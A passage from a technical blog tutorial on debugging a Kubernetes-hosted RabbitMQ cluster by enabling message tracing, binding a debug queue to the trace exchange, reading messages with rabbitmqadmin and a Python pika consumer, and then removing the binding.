<p>Enabling the <code>rabbitmq_tracing</code> plugin creates a new exchange named <code>amq.rabbitmq.trace</code> where all messages sent to the vhost will be forwarded to.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="getting-rabbitmqadmin-binary">Getting <code>rabbitmqadmin</code> Binary<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#getting-rabbitmqadmin-binary" class="hash-link" aria-label="Direct link to getting-rabbitmqadmin-binary" title="Direct link to getting-rabbitmqadmin-binary">​</a></h2>
<p>In order to read the forwarded messages, we would need to create a new queue where all messages will be sent to and bind this new queue to the <code>amq.rabbitmq.trace</code> exchange.</p>
<p>The fastest way to do this is using the <code>rabbitmqadmin</code> command line tool.</p>
<p>We can download it from different locations but the best place is from the container itself as it will pair with the exact version of the RabbitMQ server running in the container. To copy the binary to the host machine, we run the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl </span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> rabbitmq-ha-0:/var/lib/rabbitmq/mnesia/rabbit@rabbitmq-ha-0.rabbitmq-ha-discovery.prod.svc.cluster.local-plugins-expand/rabbitmq_management-</span><span class="token variable" style="color:#36acaa">$VERSION</span><span class="token plain">/priv/www/cli/rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> rabbitmq-ha ~/rabbitmqadmin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This will download the <code>rabbitmqadmin</code> command line tool to the home (~) directory.
It’s worth to keep in mind that the path might be different in other deployments as this tutorial was tested with a specific RabbitMQ version (represented by <code>$VERSION</code>).</p>
<p>To use the <code>rabbitmqadmin</code> tool, we need to either (a) specify the configuration file path created in the <a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#configuration-optional">Configuration section</a> or (b) the command line arguments for the host, user and password alongside the rest of the commands.</p>
<p>Option (a) will be used for the remainder of the document but if you insist on not creating a configuration file, you can also run the commands in the following format:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token assign-left variable" style="color:#36acaa">ip</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$(</span><span class="token variable" style="color:#36acaa">kubectl get endpoints </span><span class="token variable parameter variable" style="color:#36acaa">-n</span><span class="token variable" style="color:#36acaa"> prod rabbitmq-ha </span><span class="token variable parameter variable" style="color:#36acaa">-o</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">jsonpath</span><span class="token variable operator" style="color:#393A34">=</span><span class="token variable string" style="color:#e3116c">'{.subsets[0].addresses[0].ip}'</span><span class="token variable" style="color:#36acaa">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> YOUR_USERNAME </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> YOUR_PASSWORD </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rest of commands</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-rabbitmq-resources-and-bindings">Creating RabbitMQ Resources and Bindings<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#creating-rabbitmq-resources-and-bindings" class="hash-link" aria-label="Direct link to Creating RabbitMQ Resources and Bindings" title="Direct link to Creating RabbitMQ Resources and Bindings">​</a></h2>
<p>Now that we have the tool to use to interact with the RabbitMQ cluster, we need to do two things before we’re able to read the RPC messages:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance </span><span class="token builtin class-name">declare</span><span class="token plain"> queue </span><span class="token assign-left variable" style="color:#36acaa">name</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ol start="2">
<li>Bind the debug queue to the exchange <code>amq.rabbitmq.trace</code>. To do this, run the following command:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance </span><span class="token builtin class-name">declare</span><span class="token plain"> binding </span><span class="token assign-left variable" style="color:#36acaa">source</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">amq.rabbitmq.trace </span><span class="token assign-left variable" style="color:#36acaa">destination</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug </span><span class="token assign-left variable" style="color:#36acaa">routing_key</span><span class="token operator" style="color:#393A34">=</span><span class="token comment" style="color:#999988;font-style:italic">#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The <code>routing_key=#</code> parameter ensures that we forward all published, delivered and consumed messages across queues and exchanges to the bound debug queue.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="reading-messages">Reading Messages<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#reading-messages" class="hash-link" aria-label="Direct link to Reading Messages" title="Direct link to Reading Messages">​</a></h2>
<p>Now that all messages are set up to be forwarded to queue debug, we can see how many there are. In the example below we have 317 messages:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance get </span><span class="token assign-left variable" style="color:#36acaa">queue</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+-------------+--------------------+---------------+---------+---------------+------------------+-------------+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> routing_key </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      exchange      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> message_count </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> payload </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> payload_bytes </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> payload_encoding </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> redelivered </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+-------------+--------------------+---------------+---------+---------------+------------------+-------------+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> publish.    </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> amq.rabbitmq.trace </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">317</span><span class="token plain">           </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">             </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> string           </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> False       </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">+-------------+--------------------+---------------+---------+---------------+------------------+-------------+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can also read the actual payload. Here we specify to read the first 5 (includes only the headers, not actual data):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance get </span><span class="token assign-left variable" style="color:#36acaa">queue</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug </span><span class="token assign-left variable" style="color:#36acaa">count</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plainspan><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">             routing_key              </span><span class="token operator" style="color:#393A34">|</span><span class="token plain">      exchange      </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> message_count </span><span class="token operator" style="color:#393A34">|</span><span class="token plainpayloadspan><span class="token operator" style="color:#393A34">|</span><span class="token plain"> payload_bytes </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> payload_encoding </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> redelivered </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plainspan><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>A better way to see the messages would be to connect to the queue as a consumer. We can do this faily easily by using the <a href="https://pika.readthedocs.io/en/stable/" target="_blank" rel="noopener noreferrer"><code>pika</code> Python library</a>.
We first need to install it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> pika</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Then we can use the following script <code>receive.py</code> to connect to it:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pika</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> sys</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cred </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pika</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PlainCredentials</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">username</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">YOUR_USER</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> password</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">YOUR_PASSWORD</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    connection </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pika</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">BlockingConnection</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pika</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ConnectionParameters</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">host</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'192.168.1.15'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> credentials</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">cred</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    channel </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> connection</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">channel</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    channel</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">queue_declare</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">queue</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'debug'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> durable</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">callback</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ch</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> method</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> properties</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> body</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">" [x] Received method '{}', body {}"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">method</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">routing_key</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> body</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    channel</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">basic_consume</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">queue</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'debug'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> on_message_callback</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">callback</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> auto_ack</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">' [*] Waiting for messages. To exit press CTRL+C'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    channel</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">start_consuming</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'__main__'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">except</span><span class="token plain"> KeyboardInterrupt</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'Interrupted'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            sys</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token plain"> SystemExit</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">_exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Keep in mind that you need to change the <code>YOUR_USER</code> and <code>YOUR_PASSWORD</code> values (as well as the <code>host=IP</code>) according to your credentials/address.</p>
<p>We can then run the script to begin consuming the messages:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> u+x receive.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./receive.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Received u</span><span class="token string" style="color:#e3116c">'{...}'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This is the stage where we would use the payload to troubleshoot our issue. In the specific case I was debugging, we found that the environment had an RPC timeout because of a very large database query to retrieve data for thousands of resources created in the application. We recommended a scaling solution to resolve it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cleanup">Cleanup<a href="https://kbbgl.github.io/blog/how-to-trace-read-rabbitmq-messages#cleanup" class="hash-link" aria-label="Direct link to Cleanup" title="Direct link to Cleanup">​</a></h2>
<p>Creating the debug queue without consumers means that the messages will get stuck there forever. This could lead to increase in server/container resources, specifically RAM, disk and CPU and in turn, to severe application performance degradation. Thererfore, it’s required to erase all created resources before terminating the session.</p>
<p>We first need to remove the binding between the exchange and the queue to stop forwarding messages to the queue. To do this, we run the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rabbitmqadmin </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> /tmp/rmq.conf </span><span class="token parameter variable" style="color:#36acaa">-N</span><span class="token plain"> instance delete binding </span><span class="token assign-left variable" style="color:#36acaa">source</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">amq.rabbitmq.trace </span><span class="token assign-left variable" style="color:#36acaa">destination</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">debug </span><span class="token assign-left variable" style="color:#36acaa">destination_type</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">queue </span><span class="token assign-left variable" style="color:#36acaa">properties_key</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"#"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">binding deleted</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Next step is to purge (i.e. delete/remove) all the messages in the debug queue:</p>
